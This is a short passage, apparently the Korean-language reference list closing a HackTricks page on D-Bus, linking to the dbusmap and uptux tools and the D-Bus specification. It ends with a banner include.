- [5] [taviso/dbusmap - "D-Bus용 Nmap"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus 문서](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
